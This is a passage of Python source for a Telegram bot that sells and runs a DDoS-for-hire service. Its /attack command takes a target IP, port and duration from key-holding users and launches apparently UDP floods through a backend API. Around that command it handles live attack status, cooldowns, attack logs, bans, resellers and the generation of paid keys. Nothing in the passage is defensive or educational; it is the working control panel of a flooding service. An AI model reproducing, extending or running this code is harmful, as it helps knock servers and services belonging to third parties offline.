                    f"📛 <b>ɴᴀᴍᴇ:</b> <b>{escape_html(name)}</b>\n"
                    f"🔗 <b>ᴜꜱᴇʀɴᴀᴍᴇ:</b> @{escape_html(username or 'N/A')}\n"
                    f"📅 <b>ᴊᴏɪɴᴇᴅ ᴀᴛ:</b> <code>{join_time_display} IST</code>\n"
                    f"👥 <b>ᴛᴏᴛᴀʟ ᴜꜱᴇʀꜱ:</b> <b>{len(ensure_dict(data['users']))}</b>\n\n"
                    "╔══════════════════════╗\n"
                    "║        ✴️ 𝗔𝗖𝗧𝗜𝗢𝗡 𝗕𝗨𝗧𝗧𝗢𝗡𝗦 🌠      ║\n"
                    "╚══════════════════════╝"
                )
                kb = InlineKeyboardMarkup()
                kb.row(
                    InlineKeyboardButton("🚫 𝐁𝐀𝐍 𝐔𝐒𝐄𝐑", callback_data=f"ban_{uid}"),
                    InlineKeyboardButton("🎁 𝐆𝐈𝐕𝐄 𝟏𝟓𝐌 𝐊𝐄𝐘", callback_data=f"give15m_{uid}")
                )
                bot.send_message(BOT_OWNER, owner_notif, reply_markup=kb, parse_mode="HTML")
            except Exception as e:
                print(f"Owner notification error: {e}")

        def send_with_sticker():
            try:
                if sticker_msg:
                    time.sleep(5)
                    safe_send(cid, text, reply_markup=kb_main(uid), parse_mode="HTML")
                    time.sleep(1)
                    try: bot.delete_message(cid, sticker_msg.message_id)
                    except: pass
                else:
                    safe_send(cid, text, reply_markup=kb_main(uid), parse_mode="HTML")
            except Exception as e:
                print(f"send_with_sticker error: {e}")

        threading.Thread(target=send_with_sticker, daemon=True).start()
    except Exception as e:
        HEALTH["total_errors"] += 1
        print(f"❌ cmd_start error: {e}")
        traceback.print_exc()

# ============= CALLBACKS =============
@bot.callback_query_handler(func=lambda call: call.data.startswith(("ban_", "give15m_", "stopatk_")))
def handle_callbacks(call):
    try:
        if call.data.startswith("stopatk_"):
            attack_id = call.data.replace("stopatk_", "", 1)
            caller_uid = call.from_user.id

            with attack_lock:
                atk = active_attacks.get(attack_id)
                if not atk:
                    try: bot.answer_callback_query(call.id, "⚠️ Attack already finished", show_alert=True)
                    except: pass
                    try:
                        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
                    except: pass
                    return

                owner_uid = atk.get('user_id')
                if caller_uid != owner_uid and not is_owner(caller_uid):
                    try: bot.answer_callback_query(call.id, "🚫 Yeh tumhara attack nahi hai!", show_alert=True)
                    except: pass
                    return

                _stop_flags[attack_id] = True
                active_attacks.pop(attack_id, None)

            try:
                bot.answer_callback_query(call.id, "⛔ ATTACK STOPPED", show_alert=True)
            except: pass

            try:
                stop_text = (
                    "╔══════════════════════════╗\n"
                    "║     ⛔ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗢𝗣𝗣𝗘𝗗       ║\n"
                    "╚══════════════════════════╝\n\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃   🛑 𝗦𝗧𝗢𝗣 𝗥𝗘𝗣𝗢𝗥𝗧 🛑\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                    f"┣ 🎯 ᴛᴀʀɢᴇᴛ ➪ <code>{escape_html(atk.get('target','N/A'))}:{atk.get('port','N/A')}</code>\n"
                    f"┣ 🛑 ꜱᴛᴏᴘᴘᴇᴅ ʙʏ ➪ <b>@{escape_html(call.from_user.username or call.from_user.first_name or 'User')}</b>\n"
                    f"┗ 📅 ᴛɪᴍᴇ ➪ <code>{ist_time_str()} IST</code>\n\n"
                    "╔══════════════════════════╗\n"
                    "║      🪦 𝗔𝗧𝗧𝗔𝗖𝗞 𝗘𝗡𝗗𝗘𝗗 🔞     ║\n"
                    "╚══════════════════════════╝"
                )
                try:
                    bot.edit_message_caption(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        caption=stop_text, parse_mode="HTML", reply_markup=None
                    )
                except:
                    try:
                        bot.edit_message_text(
                            chat_id=call.message.chat.id,
                            message_id=call.message.message_id,
                            text=stop_text, parse_mode="HTML", reply_markup=None
                        )
                    except: pass
            except: pass
            return

        if not is_owner(call.from_user.id):
            try: bot.answer_callback_query(call.id, "🚫 Owner only!", show_alert=True)
            except: pass
            return

        data_parts = call.data.split("_", 1)
        action = data_parts[0]
        target_uid = data_parts[1] if len(data_parts) > 1 else None

        if not target_uid:
            try: bot.answer_callback_query(call.id, "❌ Invalid")
            except: pass
            return

        if action == "ban":
            target_uid_str = str(target_uid)
            if target_uid_str in ensure_dict(data.get("banned_users", {})):
                try: bot.answer_callback_query(call.id, "⚠️ Already banned!", show_alert=True)
                except: pass
                return

            data["banned_users"][target_uid_str] = {
                "banned_at": datetime.now().isoformat(),
                "banned_by": call.from_user.id,
                "reason": "ʙᴀɴɴᴇᴅ ʙʏ ᴏᴡɴᴇʀ"
            }
            save_data(data)

            try:
                ban_notif = (
                    "╔══════════════════════╗\n"
                    "║        🚫 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗕𝗔𝗡𝗡𝗘𝗗 🚫      ║\n"
                    "╚══════════════════════╝\n\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃            ⛔ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗥𝗘𝗩𝗢𝗞𝗘𝗗 ⛔\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                    "🔒 <b>ᴀᴀᴘᴋᴏ ɪꜱ ʙᴏᴛ ꜱᴇ ʙᴀɴ ᴋᴀʀ ᴅɪʏᴀ ɢᴀʏᴀ ʜᴀɪ</b>\n\n"
                    f"📅 <b>ᴛɪᴍᴇ:</b> <code>{ist_time_str()} IST</code>\n\n"
                    "⚠️ <b>ᴀᴀᴘ ᴀʙ ʙᴏᴛ ᴋᴀ ᴋᴏɪ ʙʜɪ ꜰᴇᴀᴛᴜʀᴇ ᴜꜱᴇ ɴᴀʜɪ ᴋᴀʀ ꜱᴀᴋᴛᴇ</b>\n\n"
                    f"👑 <b>ᴏᴡɴᴇʀ ɪᴅ:</b> <code>{BOT_OWNER}</code>\n\n"
                    "╔══════════════════════╗\n"
                    "║        🔒 𝗔𝗖𝗖𝗘𝗦𝗦 𝗕𝗟𝗢𝗖𝗞𝗘𝗗 🔒    ║\n"
                    "╚══════════════════════╝"
                )
                bot.send_message(int(target_uid), ban_notif, parse_mode="HTML", reply_markup=dev_btn_kb())
            except Exception as e: print(f"Ban notif error: {e}")

            try: bot.answer_callback_query(call.id, f"✅ User {target_uid} banned!", show_alert=True)
            except: pass

            try:
                new_text = call.message.text + (
                    f"\n\n╔══════════════════════════╗\n"
                    f"║                   ✅ 𝗕𝗔𝗡𝗡𝗘𝗗 ✅                       ║\n"
                    f"╚══════════════════════════╝\n"
                    f"┗➤ ᴜꜱᴇʀ ʙᴀɴɴᴇᴅ ᴀᴛ <code>{ist_time_str()} IST</code>"
                )
                bot.edit_message_text(
                    chat_id=call.message.chat.id, message_id=call.message.message_id,
                    text=new_text, parse_mode="HTML", reply_markup=None
                )
            except: pass

        elif action == "give15m":
            rp = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
            new_key = f"BeStChEaT-{rp[:3]}{rp[3:6]}-15Min"
            data["keys"][new_key] = {
                "seconds": 900, "duration_text": "15 ᴍɪɴᴜᴛᴇꜱ",
                "created_at": datetime.now().isoformat(),
                "used": False, "used_by": None,
                "generated_for": str(target_uid)
            }
            save_data(data)

            key_notif = (
                "╔══════════════════════════╗\n"
                "║         🎁 𝗬𝗢𝗨 𝗚𝗢𝗧 𝗔 𝗞𝗘𝗬 🎁             ║\n"
                "╚══════════════════════════╝\n\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃        💎 𝗙𝗥𝗢𝗠 𝗢𝗪𝗡𝗘𝗥 💎\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                "🎉 <b>ᴀᴀᴘᴋᴏ ᴏᴡɴᴇʀ ꜱᴇ 15 ᴍɪɴᴜᴛᴇꜱ ᴋᴀ ᴋᴇʏ ᴍɪʟᴀ ʜᴀɪ!</b>\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔑 <b>ʏᴏᴜʀ ᴋᴇʏ:</b>\n<code>{new_key}</code>\n"
                f"⏰ <b>ᴅᴜʀᴀᴛɪᴏɴ:</b> <b>15 ᴍɪɴᴜᴛᴇꜱ</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "⚠️ <b>ᴋᴇʏ ᴀᴄᴛɪᴠᴀᴛᴇ ᴋᴀʀɴᴇ ᴋᴇ ʟɪʏᴇ ʀᴇᴅᴇᴇᴍ ᴋᴀʀᴏ:</b>\n"
                f"➤ <code>/redeem {new_key}</code>\n\n"
                "╔══════════════════════════╗\n"
                "║             ⚡ 𝗥𝗘𝗗𝗘𝗘𝗠 𝗡𝗢𝗪 ⚡              ║\n"
                "╚══════════════════════════╝"
            )
            try: bot.send_message(int(target_uid), key_notif, parse_mode="HTML")
            except Exception as e: print(f"Key notif error: {e}")

            try: bot.answer_callback_query(call.id, f"✅ 15m key sent!", show_alert=True)
            except: pass

            try:
                new_text = call.message.text + (
                    f"\n\n╔══════════════════════════╗\n"
                    f"║         🎁 𝗞𝗘𝗬 𝗚𝗜𝗩𝗘𝗡 🎁      ║\n"
                    f"╚══════════════════════════╝\n"
                    f"┣ 🔑 ᴋᴇʏ ➪ <code>{new_key}</code>\n"
                    f"┣ ⏰ ᴅᴜʀᴀᴛɪᴏɴ ➪ <b>15 ᴍɪɴᴜᴛᴇꜱ</b>\n"
                    f"┗ 📅 ᴛɪᴍᴇ ➪ <code>{ist_time_str()} IST</code>"
                )
                bot.edit_message_text(
                    chat_id=call.message.chat.id, message_id=call.message.message_id,
                    text=new_text, parse_mode="HTML", reply_markup=None
                )
            except: pass
    except Exception as e:
        HEALTH["total_errors"] += 1
        print(f"Callback error: {e}")
        traceback.print_exc()
        try: bot.answer_callback_query(call.id, f"❌ Error", show_alert=True)
        except: pass

# ============= ATTACK =============
@bot.message_handler(commands=['attack'])
def cmd_attack(msg):
    try:
        HEALTH["total_messages"] += 1
        HEALTH["total_commands"] += 1
        if check_ban(msg): return
        uid = msg.from_user.id
        cid = msg.chat.id

        if get_setting('maintenance_mode', False) and not is_owner(uid):
            safe_reply(msg, f"🔧 {get_setting('maintenance_msg', 'Maintenance')}"); return

        if not is_owner(uid) and not has_valid_key(uid):
            safe_reply(msg, "⚠️ <b>ɴᴏ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ!</b> /redeem ꜰɪʀꜱᴛ.", parse_mode="HTML"); return

        parts = msg.text.split()[1:]
        if len(parts) != 3:
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║    🎯 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 🎯    ║\n"
                "╚══════════════════════════╝\n\n"
                "📌 <b>ᴜꜱᴀɢᴇ:</b>\n"
                "<code>/attack IP PORT TIME</code>\n\n"
                "📝 <b>ᴇxᴀᴍᴘʟᴇ:</b>\n"
                "<code>/attack 1.2.3.4 80 60</code>",
                parse_mode="HTML")
            return

        ip, ps, ds = parts
        if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
            safe_reply(msg, "❌ <b>ɪɴᴠᴀʟɪᴅ ɪᴘ!</b>", parse_mode="HTML"); return

        try:
            port = int(ps); dur = int(ds)
            if not (1 <= port <= 65535): safe_reply(msg, "❌ ᴘᴏʀᴛ 1-65535!"); return
            if dur < 1: safe_reply(msg, "❌ ᴍɪɴ 1ꜱ!"); return
            if dur > get_setting('max_attack_time', 300) and not is_owner(uid):
                safe_reply(msg, f"❌ ᴍᴀx {get_setting('max_attack_time', 300)}ꜱ!"); return
        except:
            safe_reply(msg, "❌ ɪɴᴠᴀʟɪᴅ ᴘᴏʀᴛ/ᴛɪᴍᴇ!"); return

        cd = get_cd_remaining(uid)
        if cd > 0 and not is_owner(uid):
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║    ⏸️ 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡 𝗔𝗖𝗧𝗜𝗩𝗘 ⏸️   ║\n"
                "╚══════════════════════════╝\n\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃   ⏰ 𝗪𝗔𝗜𝗧 𝗧𝗜𝗠𝗘 ⏰\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                f"┣ ⏳ ʀᴇᴍᴀɪɴɪɴɢ ➪ <b>{cd} ꜱᴇᴄᴏɴᴅꜱ</b>\n"
                f"┣ ⏸️ ᴄᴏᴏʟᴅᴏᴡɴ ➪ <b>{get_setting('user_cooldown', 5)} ꜱᴇᴄᴏɴᴅꜱ</b>\n"
                f"┗ 📅 ᴛɪᴍᴇ ➪ <code>{ist_time_str()} IST</code>\n\n"
                "╔══════════════════════════╗\n"
                "║     🔥 ʀᴇᴀᴅʏ ᴀꜰᴛᴇʀ ᴄᴅ 🔥      ║\n"
                "╚══════════════════════════╝",
                parse_mode="HTML")
            return

        if is_attack_running(uid):
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║     ❌ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗥𝗨𝗡𝗡𝗜𝗡𝗚 ❌    ║\n"
                "╚══════════════════════════╝\n\n"
                "⚠️ <b>ᴀᴀᴘᴋᴀ ᴇᴋ ᴀᴛᴛᴀᴄᴋ ᴀʟʀᴇᴀᴅʏ ʀᴜɴɴɪɴɢ ʜᴀɪ!</b>\n\n"
                "🛑 <b>ᴘᴇʜʟᴇ ᴜꜱᴇ ᴋᴏ ꜱᴛᴏᴘ ᴋᴀʀᴏ!</b>",
                parse_mode="HTML")
            return

        set_cd(uid)
        name = msg.from_user.username or f"User_{uid}"

        ok, r = api_attack(ip, port, dur)
        if not ok:
            safe_reply(msg, f"❌ <b>ꜰᴀɪʟᴇᴅ</b>\n<code>{escape_html(r[:300])}</code>", parse_mode="HTML"); return

        HEALTH["total_attacks"] += 1
        start_time = datetime.now()
        end_time = start_time + timedelta(seconds=dur)
        attack_id = f"{uid}_{int(time.time()*1000)}"
        _stop_flags[attack_id] = False

        def build_attack_caption():
            try:
                now = datetime.now()
                elapsed = int((now - start_time).total_seconds())
                rem = max(0, dur - elapsed)
                pct = min(100, int((elapsed / dur) * 100)) if dur > 0 else 0
                filled = int(pct / 10)
                bar = "▰" * filled + "▱" * (10 - filled)

                if pct < 20: st = "🔴 ᴊᴜꜱᴛ ꜱᴛᴀʀᴛᴇᴅ"
                elif pct < 50: st = "🟠 ɪɴ ᴘʀᴏɢʀᴇꜱꜱ"
                elif pct < 80: st = "🟡 ᴍᴏʀᴇ ᴛʜᴀɴ ʜᴀʟꜰ"
                elif pct < 100: st = "🟢 ᴀʟᴍᴏꜱᴛ ᴅᴏɴᴇ"
                else: st = "✅ ᴄᴏᴍᴘʟᴇᴛᴇ"

                rem_m = rem // 60; rem_s = rem % 60
                start_str = ist_time_str(start_time)
                end_str = ist_time_str(end_time)
                method_str = escape_html(get_setting('api_method', 'UDP-BIG'))
                geo_str = escape_html(get_setting('api_geolocation', 'ALL'))

                return (
                    "╔══════════════════════════╗\n"
                    "║    🐣 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗 🦜   ║\n"
                    "╚══════════════════════════╝\n\n"
                    + f"{bar} {pct}%\n"
                    + f"{st}\n\n"
                    + "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    + "┃  ⚔️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗘𝗧𝗔𝗜𝗟𝗦\n"
                    + "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    + f"┣ 👤 ᴜꜱᴇʀ ➪ <b>@{escape_html(name)}</b>\n"
                    + f"┣ 🎯 ᴛᴀʀɢᴇᴛ ➪ <code>{ip}:{port}</code>\n"
                    + f"┣ ⏱️ ᴅᴜʀᴀᴛɪᴏɴ ➪ <b>{dur}ꜱ</b>\n"
                    + f"┣ 🚀 ᴍᴇᴛʜᴏᴅ ➪ <b>{method_str}</b>\n"
                    + f"┗ 🌍 ɢᴇᴏ ➪ <code>{geo_str}</code>\n\n"
                    + "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    + "┃  ⏰ 𝗧𝗜𝗠𝗘 𝗧𝗥𝗔𝗖𝗞𝗜𝗡𝗚\n"
                    + "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    + f"┣ ▶️ ꜱᴛᴀʀᴛ ➪ <code>{start_str} IST</code>\n"
                    + f"┣ ⏹️ ᴇɴᴅ ➪ <code>{end_str} IST</code>\n"
                    + f"┣ ⏳ ᴇʟᴀᴘꜱᴇᴅ ➪ <b>{elapsed}ꜱ</b>\n"
                    + f"┗ ⏱️ ʀᴇᴍᴀɪɴɪɴɢ ➪ <b>{rem_m}ᴍ {rem_s}ꜱ</b>\n\n"
                    + "╔══════════════════════════╗\n"
                    + "║   🍭 𝗔𝗧𝗧𝗔𝗖𝗞 𝗥𝗨𝗡𝗡𝗜𝗡𝗚 🥂      ║\n"
                    + "╚══════════════════════════╝"
                )
            except: return "💀 ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ..."

        stop_kb = InlineKeyboardMarkup()
        stop_kb.add(InlineKeyboardButton("⛔ 𝐒𝐓𝐎𝐏 𝐀𝐓𝐓𝐀𝐂𝐊 ⛔", callback_data=f"stopatk_{attack_id}"))

        chosen_video = get_random_video()
        attack_msg = None
        is_video = False

        if chosen_video:
            try:
                attack_msg = bot.send_video(cid, chosen_video, caption=build_attack_caption(), parse_mode="HTML", reply_markup=stop_kb)
                is_video = True
            except:
                attack_msg = bot.reply_to(msg, build_attack_caption(), parse_mode="HTML", reply_markup=stop_kb)
        else:
            attack_msg = bot.reply_to(msg, build_attack_caption(), parse_mode="HTML", reply_markup=stop_kb)

        data["attack_logs"].append({
            'user_id': uid, 'username': name, 'target': ip, 'port': port,
            'duration': dur, 'timestamp': datetime.now().isoformat()
        })
        if str(uid) in ensure_dict(data.get("users", {})):
            if isinstance(data["users"][str(uid)], dict):
                data["users"][str(uid)]["total_attacks"] = safe_int(data["users"][str(uid)].get("total_attacks", 0)) + 1
        save_data(data)

        with attack_lock:
            active_attacks[attack_id] = {
                'target': ip, 'port': port, 'duration': dur,
                'user_id': uid, 'username': name,
                'end_time': end_time, 'start_time': start_time
            }

        def auto_update_attack():
            last_text = None
            for _ in range(dur // 3 + 5):
                time.sleep(3)
                if _stop_flags.get(attack_id, False): break
                now = datetime.now()
                if now >= end_time: break
                try:
                    new_text = build_attack_caption()
                    if new_text != last_text:
                        try:
                            if is_video:
                                bot.edit_message_caption(
                                    chat_id=cid, message_id=attack_msg.message_id,
                                    caption=new_text, parse_mode="HTML", reply_markup=stop_kb
                                )
                            else:
                                bot.edit_message_text(
                                    chat_id=cid, message_id=attack_msg.message_id,
                                    text=new_text, parse_mode="HTML", reply_markup=stop_kb
                                )
                            last_text = new_text
                        except Exception as e:
                            err = str(e)
                            if "message is not modified" in err.lower(): continue
                            if "Too Many Requests" in err or "retry after" in err.lower():
                                time.sleep(5); continue
                except: pass

        threading.Thread(target=auto_update_attack, daemon=True).start()

        def done():
            time.sleep(dur)
            if _stop_flags.get(attack_id, False):
                _stop_flags.pop(attack_id, None)
                return
            with attack_lock: active_attacks.pop(attack_id, None)
            _stop_flags.pop(attack_id, None)
            complete_caption = (
                "╔══════════════════════════╗\n"
                "║   ✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 ✅    ║\n"
                "╚══════════════════════════╝\n\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  📊 𝗙𝗜𝗡𝗔𝗟 𝗥𝗘𝗣𝗢𝗥𝗧\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"┣ 👤 ᴜꜱᴇʀ ➪ <b>@{escape_html(name)}</b>\n"
                f"┣ 🎯 ᴛᴀʀɢᴇᴛ ➪ <code>{ip}:{port}</code>\n"
                f"┣ ⏱️ ᴅᴜʀᴀᴛɪᴏɴ ➪ <b>{dur}ꜱ</b>\n"
                f"┣ ▶️ ꜱᴛᴀʀᴛ ➪ <code>{ist_time_str(start_time)} IST</code>\n"
                f"┗ ⏹️ ᴇɴᴅ ➪ <code>{ist_time_str(end_time)} IST</code>\n\n"
                "╔══════════════════════════╗\n"
                "║      🍹 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗢𝗡𝗘 🍺      ║\n"
                "╚══════════════════════════╝"
            )
            try:
                if is_video:
                    bot.edit_message_caption(
                        chat_id=cid, message_id=attack_msg.message_id,
                        caption=complete_caption, parse_mode="HTML", reply_markup=None
                    )
                else:
                    bot.edit_message_text(
                        chat_id=cid, message_id=attack_msg.message_id,
                        text=complete_caption, parse_mode="HTML", reply_markup=None
                    )
            except:
                try: bot.send_message(cid, complete_caption, parse_mode="HTML")
                except: pass

        threading.Thread(target=done, daemon=True).start()
    except Exception as e:
        HEALTH["total_errors"] += 1
        print(f"❌ cmd_attack error: {e}")
        traceback.print_exc()

# ============= STATUS =============
def do_status(msg):
    try:
        if check_ban(msg): return
        uid = msg.from_user.id
        cid = msg.chat.id

        try:
            status_msg = bot.send_message(cid, "📊 ʟᴏᴀᴅɪɴɢ ꜱᴛᴀᴛᴜꜱ...")
        except Exception as e:
            print(f"Status send error: {e}"); return

        def build_status():
            try:
                now = datetime.now()
                running = []
                try:
                    with attack_lock:
                        for aid, atk in list(active_attacks.items()):
                            if not isinstance(atk, dict): continue
                            end_t = atk.get('end_time')
                            if not isinstance(end_t, datetime): continue
                            if end_t > now: running.append(dict(atk))
                except: running = []

                uptime_sec = int((datetime.now() - BOT_START_TIME).total_seconds())
                days = uptime_sec // 86400; hrs = (uptime_sec % 86400) // 3600
                mins = (uptime_sec % 3600) // 60; secs = uptime_sec % 60
                uptime_str = f"{days:02d}ᴅ {hrs:02d}ʜ {mins:02d}ᴍ {secs:02d}ꜱ"

                total_users = len(ensure_dict(data.get('users', {})))
                total_attacks = len(ensure_list(data.get('attack_logs', [])))
                total_keys = len(ensure_dict(data.get('keys', {})))
                total_stickers = len(ensure_list(data.get('stickers', [])))
                total_videos = len(ensure_list(data.get('videos', [])))
                total_pyf = len(ensure_list(data.get('pyf_videos', [])))
                total_banned = len(ensure_dict(data.get('banned_users', {})))

                user_data = ensure_dict(data.get('users', {})).get(str(uid), {})
                if not isinstance(user_data, dict): user_data = {}
                user_attacks = safe_int(user_data.get('total_attacks', 0))
                time_left = time_remaining(uid)
                role = "👑 ᴏᴡɴᴇʀ" if is_owner(uid) else ("💼 ʀᴇꜱᴇʟʟᴇʀ" if is_reseller(uid) else "👤 ᴜꜱᴇʀ")

                txt = ""

                if running:
                    atk = running[0]
                    atk_start = atk.get('start_time', now)
                    if not isinstance(atk_start, datetime): atk_start = now
                    atk_end = atk.get('end_time', now)
                    if not isinstance(atk_end, datetime): atk_end = now
                    rem = max(0, int((atk_end - now).total_seconds()))
                    dur = safe_int(atk.get('duration', 60), 60)
                    elapsed = max(0, dur - rem)
                    pct = min(100, int((elapsed / dur) * 100)) if dur > 0 else 0
                    filled = int(pct / 10)
                    bar = "▰" * filled + "▱" * (10 - filled)

                    if pct < 20: st = "🔴 ᴊᴜꜱᴛ ꜱᴛᴀʀᴛᴇᴅ"
                    elif pct < 50: st = "🟠 ɪɴ ᴘʀᴏɢʀᴇꜱꜱ"
                    elif pct < 80: st = "🟡 ᴍᴏʀᴇ ᴛʜᴀɴ ʜᴀʟꜰ"
                    elif pct < 100: st = "🟢 ᴀʟᴍᴏꜱᴛ ᴅᴏɴᴇ"
                    else: st = "✅ ᴄᴏᴍᴘʟᴇᴛᴇ"

                    target = escape_html(f"{atk.get('target', 'N/A')}:{atk.get('port', 'N/A')}")
                    uname = escape_html(atk.get('username', 'Unknown'))
                    rem_m = rem // 60; rem_s = rem % 60
                    el_m = elapsed // 60; el_s = elapsed % 60

                    txt += (
                        "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
                        "▌   🎯 𝗟𝗜𝗩𝗘 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦   ▐\n"
                        "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
                        + f"{bar} {pct}%\n"
                        + f"{st}\n\n"
                        + "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                        + "┃  ⚔️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗘𝗧𝗔𝗜𝗟𝗦\n"
                        + "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                        + f"┣ 🎯 ᴛᴀʀɢᴇᴛ ➪ <code>{target}</code>\n"
                        + f"┣ ▶️ ꜱᴛᴀʀᴛ ➪ <code>{ist_time_str(atk_start)} IST</code>\n"
                        + f"┣ ⏹️ ᴇɴᴅ ➪ <code>{ist_time_str(atk_end)} IST</code>\n"
                        + f"┣ ⏳ ᴇʟᴀᴘꜱᴇᴅ ➪ <b>{el_m}ᴍ {el_s}ꜱ</b>\n"
                        + f"┣ ⏱️ ʀᴇᴍᴀɪɴɪɴɢ ➪ <b>{rem_m}ᴍ {rem_s}ꜱ</b>\n"
                        + f"┗ 👤 ᴜꜱᴇʀ ➪ <b>@{uname}</b>\n\n"
                    )

                method = escape_html(get_setting('api_method', 'UDP-BIG'))
                geo = escape_html(get_setting('api_geolocation', 'ALL'))

                api_status = HEALTH.get("api_status", "🟡 ᴜɴᴋɴᴏᴡɴ")
                api_ping = safe_int(HEALTH.get("last_api_ping_ms", 0))
                api_success = safe_int(HEALTH.get("api_success", 0))
                api_failed = safe_int(HEALTH.get("api_failed", 0))
                total_errors = safe_int(HEALTH.get("total_errors", 0))
                total_msgs = safe_int(HEALTH.get("total_messages", 0))
                total_cmds = safe_int(HEALTH.get("total_commands", 0))

                if api_ping == 0: ping_icon = "⚪"; ping_status = "ɴᴏ ᴘɪɴɢ"
                elif api_ping < 200: ping_icon = "🟢"; ping_status = "ᴇxᴄᴇʟʟᴇɴᴛ"
                elif api_ping < 500: ping_icon = "🟡"; ping_status = "ɢᴏᴏᴅ"
                elif api_ping < 1000: ping_icon = "🟠"; ping_status = "ꜱʟᴏᴡ"
                else: ping_icon = "🔴"; ping_status = "ᴠᴇʀʏ ꜱʟᴏᴡ"

                txt += (
                    "╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬\n"
                    "╬   📊 🇧 🇴 🇹 𝗦𝗧𝗔𝗧𝗨𝗦 📊   ╬\n"
                    "╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬\n\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃   🤖 𝗕𝗢𝗧 𝗜𝗡𝗙𝗢\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    + f"┣ ⚡ ꜱᴛᴀᴛᴜꜱ ➪ 🟢 <b>ᴏɴʟɪɴᴇ</b>\n"
                    + f"┣ ⏱️ ᴜᴘᴛɪᴍᴇ ➪ <b>{uptime_str}</b>\n"
                    + f"┣ 🎯 ᴍᴇᴛʜᴏᴅ ➪ <code>{method}</code>\n"
                    + f"┗ 🌍 ɢᴇᴏ ➪ <code>{geo}</code>\n\n"
                    + "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    + "┃   💚 𝗛𝗘𝗔𝗟𝗧𝗛 𝗖𝗛𝗘𝗖𝗞\n"
                    + "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    + f"┣ 📡 ᴀᴘɪ ➪ {api_status}\n"
                    + f"┣ {ping_icon} ᴘɪɴɢ ➪ <b>{api_ping}ᴍꜱ</b> ({ping_status})\n"
                    + f"┣ ✅ ꜱᴜᴄᴄᴇꜱꜱ ➪ <b>{api_success}</b>\n"
                    + f"┣ ❌ ꜰᴀɪʟᴇᴅ ➪ <b>{api_failed}</b>\n"
                    + f"┣ 💬 ᴍꜱɢꜱ ➪ <b>{total_msgs}</b>\n"
                    + f"┣ ⚙️ ᴄᴍᴅꜱ ➪ <b>{total_cmds}</b>\n"
                    + f"┗ ⚠️ ᴇʀʀᴏʀꜱ ➪ <b>{total_errors}</b>\n\n"
                    + "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    + "┃   📈 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦\n"
                    + "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    + f"┣ 👥 ᴜꜱᴇʀꜱ ➪ <b>{total_users}</b>\n"
                    + f"┣ 🔑 ᴋᴇʏꜱ ➪ <b>{total_keys}</b>\n"
                    + f"┣ 💀 ᴀᴛᴛᴀᴄᴋꜱ ➪ <b>{total_attacks}</b>\n"
                    + f"┣ 🚫 ʙᴀɴɴᴇᴅ ➪ <b>{total_banned}</b>\n"
                    + f"┣ ❄ ꜱᴛɪᴄᴋᴇʀꜱ ➪ <b>{total_stickers}</b>\n"
                    + f"┣ 📹 ᴠɪᴅᴇᴏꜱ ➪ <b>{total_videos}</b>\n"
                    + f"┗ 🎬 ᴘʏꜰ ➪ <b>{total_pyf}</b>\n\n"
                    + "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
